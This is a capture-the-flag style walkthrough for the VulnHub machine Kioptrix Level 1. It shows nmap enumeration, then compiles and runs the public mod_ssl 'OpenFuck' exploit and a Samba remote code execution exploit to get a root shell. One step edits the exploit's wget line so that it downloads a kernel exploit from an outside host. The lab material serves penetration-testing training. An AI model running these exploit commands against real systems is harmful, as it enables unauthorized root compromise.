# Machine Link
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

# Enumeration

Finding the internal network ip with namp :
```bash
nmap -sn 192.168.1.1/24
```

The ip in this case is 192.168.1.104

**Scanning for open ports**
```bash
nmap -v -sT -sV -p- 192.168.1.104

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:B9:A3:58 (Oracle VirtualBox virtual NIC)
```

On Port 80 a apache test page was running :
![Uploading image.png…]()


# Exploiting with mod_ssl 2.8.4

In nmap scan we found the mod_ssl version to be 2.8.4

We can search for this on searchsploit locally :
```bash
searchsploit mod_ssl 
```

<img width="1904" height="312" alt="image" src="https://github.com/user-attachments/assets/c07b6780-1c10-43d6-be9a-806f686c481d" />

We found the OpenFuckV2 exploit 

We can also get the same exploit from exploitdb :

https://www.exploit-db.com/exploits/764

I will be using the searchsploit 704.c exploit. For that copy the exploit to other location :

```bash
#install this tool for compiling :
apt install libssl-dev

#copy the exploit
cp /usr/share/exploitdb/exploits/unix/remote/764.c /home/hell/Downloads

```

Now we need to make some changes in the exploit. Open the exploit in a text editor and than add these two lines in `#include` part :

```
#include <openssl/rc4.h>
#include <openssl/md5.h>
```

Also we need to change the wget link of the ptrace-kmod.c file to :
```
wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```

Original Link:
<img width="1906" height="1050" alt="image" src="https://github.com/user-attachments/assets/e95bf917-51cc-4b75-823f-3d825ddf2232" />


Updated Link :
<img width="1912" height="1048" alt="image" src="https://github.com/user-attachments/assets/056a00f1-409c-4483-9300-8a25b026647e" />

After doing these 2 changes compile the exploit :

```bash
gcc -o kioptrix_exploit 764.c -lcrypto
```

### Using the Exploit

```bash
./kioptrix_exploit
```

Now we need to find the OffSet code of apache in our case from nmap output we got the apache version : Apache/1.3.20

```bash
./kioptrix_exploit 0x6b 192.168.1.104 -c 50
```

<img width="1337" height="944" alt="image" src="https://github.com/user-attachments/assets/814c521b-c2bd-4070-b8c3-125ed163c1c9" />

---
# Exploiting with SMB

### FInding Samba Version

Here we do not get the samba version, also with nc we do not get the samba version sometimes .

Using tcpdump and smbclient to find samba version :

```bash
tcpdump -s0 -n -i wlan0 src 192.168.1.104 and port 139 -A -c 10 2>/dev/null | grep -i "samba\|s.a.m"

#than on other terminal
smbclient -L //<machine-IP> smbclient -L //192.168.1.104
```

<img width="1896" height="622" alt="image" src="https://github.com/user-attachments/assets/84a4e613-4c84-4195-9229-e72f90105473" />


We found the version : **Samba 2.2.1.a**

Search on google for exploits of this version

[Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)

Download the c file and compile it using :

```bash
gcc 10.c -o 10
```

### Exploiting

Now use the script with machine ip and you will get the root shell :

```bash
./10 -bBcCdfprsStv 192.168.1.104
```

<img width="1409" height="861" alt="image" src="https://github.com/user-attachments/assets/6991befc-6561-4f26-b6d3-29466f7e32f4" />

---
